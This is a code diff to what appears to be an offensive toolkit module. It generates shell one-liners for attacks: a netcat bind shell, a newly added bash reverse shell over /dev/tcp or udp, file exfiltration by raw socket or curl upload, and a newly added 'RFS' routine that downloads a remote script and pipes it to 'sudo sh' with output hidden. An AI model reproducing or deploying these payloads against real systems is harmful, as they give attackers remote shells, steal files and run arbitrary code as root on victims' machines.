@@ -10,12 +10,17 @@ class Shells:
 		def ncbind(ip,port,protocol):
 			return f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l {ip} {port} > /tmp/f &; "
 
+		def bash(ip,port,shell,protocol):
+			return f"bash -c \\\"{shell} -i >& /dev/{protocol}/{ip}/{port} 0>&1 & \\\"; "
 class Exfil:
 	def socket(ip,port,file):
 		return f"cat {file} &> /dev/tcp/{ip}/{port} ;"
 	def pflask(ip, port, file):
 		return f"bash -c \\\"curl -F 'file=@{file}' http://{ip}:{port}/up &> /dev/null &\\\"; "
 
+class RFS:
+	def run(ip,port,schema):
+		return f"bash -c \\\"curl {schema}://{ip}:{port}/rfs | sudo sh\\\" &> /dev/null; "
 
 
 
